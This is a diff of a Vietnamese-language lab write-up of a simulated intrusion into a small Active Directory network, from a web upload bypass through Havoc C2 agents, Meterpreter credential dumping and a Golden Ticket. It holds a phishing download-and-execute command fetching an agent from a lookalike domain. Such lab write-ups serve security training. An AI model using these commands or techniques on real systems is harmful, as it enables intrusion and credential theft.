@@ -10,9 +10,11 @@ Hệ thống lab được build bằng VMware workstation pro.
 
 ## **2. Phân tích quá trình tấn công**
 ### **2.1 Kịch bản tấn công**
+Mô hình bao gồm hệ thống Active Directory (AD), máy chủ Web (Web Server), và máy trạm Client (Windows 10). Hệ thống này mô phỏng một mạng doanh nghiệp điển hình.
+
 AD: `phongbat.com`
 
-WEb: 'home.phongbat.com'
+Web: 'home.phongbat.com'
 
 ![](/Images/picture1.png)
 
@@ -24,6 +26,8 @@ Hệ thống nội bộ gồm 4 máy:
 
 - Máy Attacker sử dụng `Kali Linux` dùng để xâm nhập vào hệ thống nội bộ ở trên.
 
+Để tạo backdoor ta sử dụng `Havoc Framework`, lý do là Havoc Framework được chọn do tính năng mạnh mẽ, khả năng tùy chỉnh, và ít bị phát hiện bởi các hệ thống EDR/AV hiện nay.
+
 Giới thiệu về `Havoc Framework`: một framework mã nguồn mở cho phép cài đặt và vận hành C2 server một cách dễ dàng, tích hợp nhiều tính năng giúp cho việc quản lí, duy trì trong hệ thống mạng đã khai thác, được sử dụng như một giải pháp thay thế cho `Cobalt Strike` và `Brute Ratel` (post-exploitation C2 framework). C2 framework cung cấp cho các threat actor khả năng thả beacon trên các mạng bị xâm chiếm để vận chuyển các payload độc hại. Trong những năm qua, `Cobalt Strike` và `Brute Ratel` đã trở thành công cụ phổ biến để các threat actor cung cấp payload độc hại cho những nạn nhân được nhắm tới. Điều này đã khiến các nhà phát triển và tổ chức C2 sử dụng `Cobalt Strike` và `Brute Ratel` phải cảnh giác hơn với phần mềm độc hại tiềm ẩn bên trong repository của họ. Với `Havoc`, các threat actor được cung cấp một lựa chọn mới trong việc nhắm mục tiêu và khai thác hệ thống mạng.
 
 Về hệ thống C2 Server, gồm 3 thành phần chính:
@@ -33,11 +37,11 @@ Về hệ thống C2 Server, gồm 3 thành phần chính:
 
 ![](/Images/picture2.png)
 
-Attacker có thể xâm nhập vào hệ thống thông qua 2 cách tiếp cận: exploit từ Web01 đi vào, tải và thực thi file agent, sau đó gửi malware phishing cho WS01, từ đó máy WS01 này sẽ tải agent và thực thi để thêm vào C2 Server, duy trì sự hiện diện trong hệ thống.
+Attacker có thể xâm nhập vào hệ thống thông qua 2 cách tiếp cận: exploit từ Web01 đi vào, tải và thực thi file agent, sau đó gửi malware phishing cho WS01, WS02, từ đó máy WS01 hoặc WS02 này sẽ tải agent và thực thi để thêm vào C2 Server, duy trì sự hiện diện trong hệ thống.
 
 ### **2.2 Phân tích cụ thể**
 #### **2.2.1. Reconnaissance (T1595.003 - Active Scanning).**
-Truy cập vào trang chủ chính `home.phongbat.com' ta chỉ thấy được các giao diện thông thường, test qua vài lỗ hổng trong OWASP nhưng không có gì bất thường.
+Truy cập vào trang chủ chính `home.phongbat.com' ta chỉ thấy được các giao diện thông thường, kiểm tra vài lỗ hổng trong OWASP nhưng không có gì bất thường.
 
 <p align="center">
     <img src="/Images/Picture3.png" width="49%" />
@@ -45,11 +49,11 @@ Truy cập vào trang chủ chính `home.phongbat.com' ta chỉ thấy được 
 </p>
 
 Tiến hành scandir xem có thư mục nào ẩn không ta tìm được một vài directory ẩn: `/robots.txt`,`/admin`.
-
+- ! còn thiếu ảnh
 ![](/Images/Picture4.png)
 
-Ta tìm được một trang web cho phép upload ảnh online.Tấn công upload: Trang upload chỉ cho phép .jpg.
-Tuy nhiên, bypass bằng cách tải lên shell.php.jpg và chiếm quyền Web Server.
+Ta tìm được một trang web cho phép upload ảnh online.  Trang upload chỉ cho phép .jpg.
+Tuy nhiên, bypass bằng cách tải lên shell.php.jpg chúng ta có thể chiếm quyền Web Server.
 
 
 <p align="center">
@@ -65,7 +69,7 @@ Tuy nhiên, bypass bằng cách tải lên shell.php.jpg và chiếm quyền Web
 #### **2.2.1. Initial Access .**
 *Leo thang đặc quyền:
 
-Trong quá trình reconnaissance máy web, tìm thấy một file `config` chứa thông tin của user khác ở đường dẫn `/var/www/config`.
+Vì chúng ta có quyền thấp nên cần phải nâng quyền lên `root` để có thể tiếp tục xâm nhập vào hệ thống nội bộ. Trong quá trình reconnaissance máy web, tìm thấy một file `config` chứa thông tin của user khác ở đường dẫn `/var/www/config`.
 Ta dùng `ssh` để chuyển sang user này xem tìm kiếm được thông tin gì không.
 
 ![](/Images/Picture9.png)
@@ -79,9 +83,12 @@ User này được cấu hình chạy nano với sudo vì vậy ta dễ dàng l�
     <img src="/Images/Picture10-2.png" />
 </p>
 
-Ta đăng nhập qua ssh sử dụng credential của ip `12.3.3.10`.
+Ta thử đăng nhập qua ssh sử dụng credential của ip `12.3.3.10`.
 
 ![](/Images/Picture11.png)
+
+Chúng ta đã chiếm được thêm máy `WS01`
+
 ![](/Images/Picture11-2.png)
 
 *Tìm kiếm thông tin:
@@ -92,16 +99,15 @@ Ta đăng nhập qua ssh sử dụng credential của ip `12.3.3.10`.
 
 Ta tìm được 3 ip sau: `12.3.3.2`, `12.3.3.10` và `12.3.3.99` => hệ thống gồm 4 máy bao gồm web.
 
-
 #### **2.2.3. Lateral Movement (T1021.001, T1570, T1534)**
 *Cắm agent vào client1:
 Tiếp theo ta sẽ sử dụng Havoc Framework để cắm agent vào máy `clien1` dễ dàng truy cập và duy trì sự hiện diện.
 
 ![](/Images/Picture13.png)
-![](/Images/Picture13-1.png)
 
 Chúng ta sẽ tạo một agent tên là teams.exe và gửi nó qua cho máy darlene bằng cách host một server có domain ms-updates.online chứa file này, sau đó kích hoạt để HavocClient hiển thị các thông tin của máy này, bao gồm cả shell, thư mục, đường dẫn, ...
 
+![](/Images/Picture13-1.png)
 ![](/Images/Picture13-2.png)
 <p align="center">
     <img src="/Images/Picture13-3.png" width="49%" />
@@ -112,13 +118,15 @@ Vậy là ta đã thành công cắm C2 Server vào máy `client1`. Ta cần ph�
 
 ![](/Images/Picture14.png)
 
+Do không tìm thấy thông tin gì ở user này nên ta cần tìm kiếm thêm thông tin ở những user khác trong `WS01`
+
 Việc đầu tiên cần làm là kiểm tra máy có mở port 3389 hay không. Và sau khi sử dụng lệnh shell `netstat -aon`, kết quả là máy có mở.
 
 ![](/Images/Picture15.png)
 
 *Dump credentials:
-Tiếp theo dump credentials của máy tryell, mục đích của việc này là để kiếm xem có các file password mà các user này để ở đâu đó trong máy không. Tại bước này, ta sẽ sử dụng `Metasploit` để tạo payload có tên là `ms-teams.exe` và lấy được `Meterpreter` của máy client1.
 
+Tiếp theo dump credentials của máy `WS01`, mục đích của việc này là để kiếm xem có các thông tin quan trọng mà các user này để ở đâu đó trong máy không. Tại bước này, ta sẽ sử dụng `Metasploit` để tạo payload có tên là `updates-ms.exe` và lấy được `Meterpreter` của máy `WS01`.
 
 Tiếp theo chạy msfconsole để tạo listener.
 ```
@@ -134,6 +142,8 @@ Sau đó, vận chuyển payload `updates-ms.exe` vừa tạo thông qua shell c
 
 ![](/Images/Picture16.png)
 
+Sau khi cùng các tool của Meterperter ta tìm được các NTLM sau:
+
 ![](/Images/Picture16-2.png)
 
 Sử dụng công cụ hash decryptor online, ta tìm được các account như sau:
@@ -143,7 +153,7 @@ vantruong:P@ssword@
 dangtrung:WinClient123
 ```
 
-RDP từng user ta tìm được list email của nhân viên trong document.
+RDP từng user ta tìm được list email của các nhân viên trong document của một user khác trong `WS01`.
 
 ![](/Images/Picture17.png)
 
@@ -156,9 +166,9 @@ Vì tìm được các list email của nhân viên, ta sẽ tiến hành sử d
 Script: ``` curl ms-updates.online/updates.exe -o updates.exe & updates.exe ```  
 
 ![](/Images/Picture18.png)
-![](/Images/Picture18-1.png)
+![](/Images/Picture18-1.png)	
 
-Giả sử user 'client2' đã tải về. Khi user này mở ra và bấm vào file, script sẽ được chạy, tải file agent có tên `updates.exe` về máy và tự khởi chạy.
+Giả sử user trong 'WS02' đã tải về. Khi user này mở ra và bấm vào file, script sẽ được chạy, tải file agent có tên `updates.exe` về máy và tự khởi chạy.
 
 <p align="center">
     <img src="/Images/Picture19.png" width="49%" />
@@ -167,13 +177,17 @@ Giả sử user 'client2' đã tải về. Khi user này mở ra và bấm vào 
 
 ![](/Images/Picture19-2.png)
 
-Kiểm tra ip của máy, ta biết được ip là `12.3.3.99`. Vậy máy còn lại có ip `12.3.3.2` chính là AD.
-
-![](/Images/Picture20.png)
+Vậy ta đã chiếm được `WS02`.
 
 ![](/Images/Picture20-1.png)
 
+Kiểm tra ip của máy, ta biết được ip là `12.3.3.99`. Vậy máy còn lại có ip `12.3.3.2` chính là AD.
+
+![](/Images/Picture20.png)
+	
+
 #### **2.2.4. Command and Control (T1071.001, T1570) và Exfiltration (T1041 - Exfiltration Over C2 Channel)**
+
 Bên trong user `truongvantrung` ta tìm được cerdential của máy AD:
 
 ![](/Images/Picture21.png)
@@ -182,25 +196,31 @@ Vậy ta đã thu thập đủ thông tin của máy AD:
 - IP: `12.3.3.2`
 - Username: `phongbat`
 - Password: `Matkhaumoi@`
+
 Ta thử sử dụng credential này bằng rdp.
 
 ![](/Images/Picture22.png)
 
-Sau đó ta sẽ tạo backdoor và Tạo Golden Ticket để duy trì quyền truy cập lâu dài.
+Sau đó ta sẽ tạo backdoor bằng Golden Ticket để duy trì quyền truy cập lâu dài.
+
+Bước đầu tiên chúng ta cần thu thập NTLM của krbtgt và domain SID.
 
 <p align="center">
     <img src="/Images/Picture23.png" width="49%" />
     <img src="/Images/Picture23-2.png" width="49%" />
 </p>
 
-
+Sau khi thu thập được các thông tin cần thiết, ta sử dụng công cụ ticketer.py của Impacket để tạo gold ticket. Một lợi thế của ticketer.py là vé giả được ghi vào tệp .ccache thay vì .kirbi ;vì vậy ta không phải chuyển đổi nó. 
 <p align="center">
     <img src="/Images/Picture24.png" width="49%" />
     <img src="/Images/Picture24-1.png" width="49%" />
 </p>
 
+Ta đặt biến môi trường KRB5CCNAME thành đường dẫn của tệp TeoIT1.ccache. Tiếp theo, ta có thể sử dụng các công cụ thực thi lệnh của Impacket, chẳng hạn như psexec.py , smbexec.py hoặc wmiexec.py , để tải và xác thực bằng ticket, cuối cùng cung cấp cho ta một shell trả về.
 
 ![](/Images/Picture25.png)
+
+Vậy ta đã xâm chiếm được toàn bộ hệ thống nội bộ.
 
 ![](/Images/Picture25-1.png)
 
